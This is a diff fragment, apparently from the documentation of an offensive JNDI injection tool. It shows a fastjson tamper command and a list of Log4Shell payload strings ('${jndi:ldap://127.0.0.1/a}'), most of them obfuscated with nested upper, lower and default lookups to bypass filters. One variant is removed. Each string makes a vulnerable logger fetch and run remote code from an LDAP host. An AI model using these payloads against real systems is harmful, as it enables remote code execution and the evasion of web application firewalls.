@@ -32,7 +32,6 @@ java -cp jndi_tool.jar jndi.fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rows
 --------------------------------------------------
 ${jndi:ldap://127.0.0.1/a}
 ${j${upper:n}d${upper:i}:l${upper:d}${upper:a}p://127.0.0.1/a}
-${j${upper:n}d${upper:${upper:谋}}:l${upper:d}${upper:a}p://127.0.0.1/a}
 ${j${lower:n}d${lower:i}:l${lower:d}${lower:a}p://127.0.0.1/a}
 ${j${::-n}d${::-i}:l${::-d}${::-a}p://127.0.0.1/a}
 ${j${Omhc:qBz:-n}d${b:Hz:-i}:l${vX::-d}${puF:A:-a}p://127.0.0.1/a}
